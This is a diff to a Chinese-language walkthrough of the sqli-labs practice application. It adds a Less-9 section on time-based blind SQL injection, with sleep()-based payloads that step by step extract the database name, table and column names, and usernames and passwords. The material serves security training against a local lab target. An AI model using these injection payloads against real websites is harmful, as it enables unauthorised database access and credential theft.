@@ -132,7 +132,7 @@ information_schema.tables表示该数据库下的tables表，点表示下一级;
 该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容，也即下面表格user和passwd;
 ~~~
 
-![Less-1_21](./img/Less-1_21.png)
+![Less-1_22](./img/Less-1_22.png)
 
 
 
@@ -149,6 +149,8 @@ information_schema.tables表示该数据库下的tables表，点表示下一级;
 
 该语句意思是查询information_schema数据库下的columns表里table_name字段是users的所有column_name内容。注意table_name字段不是只存在于tables表也存在于columns表中;其实是表示所有字段对应的表名;
 ~~~
+
+![Less-1_23](./img/Less-1_23.png)
 
 ![Less-1_17](./img/Less-1_17.png)
 
@@ -1233,7 +1235,139 @@ http://localhost/sqli-labs/Less-2/
 
 ### Less-9
 
++ 正常打开页面
+
+![Less-9_1](./img/Less-9_1.PNG)
+
+第九关不管注入什么页面显示的东西都一样，这时布尔盲注不适合，布尔盲注适合页面对错误和正确结果有不同反应。如果页面一直不变这时可用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if</code>函数和<code>sleep()</code>函数。
 
 
 
++ 首先注入<code>if(a,sleep(10),1)</code>，如果a结果是真的那么执行<code>sleep(10)</code>页面延迟10秒，如果a的结果是假的执行1且页面不延迟。通过页面时间判断<code>id</code>参数是单引号字符串
 
+~~~ shell
+?id=1' and if(1=1,sleep(5),1) --+
+判断参数构造。
+~~~
+
+![Less-9_2](./img/Less-9_2.png)
+
+由例子发现时间注入可行
+
+
+
++ 注入如下语句判断数据库名长度
+
+~~~ shell
+?id=1'and if(length((select database()))>9,sleep(5),1)--+
+判断数据库名长度
+~~~
+
+![Less-9_3](./img/Less-9_3.png)
+
+如果数据库名的长度大于9则执行<code>sleep(5)</code>页面延迟五秒，如果数据库名长度不大于9则执行1且页面不延迟
+
+
+
++ 注入如下语句逐一判断数据库字符
+
+~~~ shell
+?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+~~~
+
+![](./img/Less-9_4.PNG)
+
+
+
+由于页面有延迟，说明数据库名的第一个字符的ASCII字符=115，查询<code>ASCII</code>表可得数据库名第一个字符是's'
+
+![Less-9_5](./img/Less-9_5.png)
+
+
+
++ 注入如下语句逐一判断所有表名长度
+
+~~~ shell
+?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
+~~~
+
+![Less-9_6](./img/Less-9_6.png)
+
+
+
+由于页面有延迟，说明所有表名长度大于13
+
+![Less-9_7](./img/Less-9_7.png)
+
+
+
++ 注入如下语句逐一判断所有表名
+
+~~~ shell
+?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
+~~~
+
+![Less-9_8](./img/Less-9_8.png)
+
+
+
+由于页面有延迟，说明所有数据表名第一个字符的<code>ASCII</code>值大于99
+
+![Less-9_9](./img/Less-9_9.PNG)
+
+
+
++ 
+  注入如下语句逐一判断所有字段名的长度
+
+~~~ shell
+?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
+~~~
+
+由于页面没有延迟，说明所有字段名长度不大于20
+
+![Less-9_10](./img/Less-9_10.png)
+
+
+
++ 注入如下语句逐一判断字段名
+
+~~~ shell
+?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
+~~~
+
+由于页面有延迟，说明所有字段名第一个字符的<code>ASCII</code>值大于99
+
+![Less-9_11](./img/Less-9_11.png)
+
+
+
++ 注入如下语句逐一判断字段内容长度
+
+  ~~~ shell
+  ?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
+  ~~~
+
+  由于页面有延迟，说明字段内容长度大于109
+
+  ![Less-9_12](./img/Less-9_12.png)
+
+
+
++ 注入如下语句逐一判断内容
+
+  ~~~ shell
+  ?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
+  ~~~
+
+  由于页面有延迟，说明内容第一个字符的<code>ASCII</code>值大于50
+
+![Less-9_13](./img/Less-9_13.png)
+
+
+
++ 最终爆破成功
+
+
+
+### Less-10
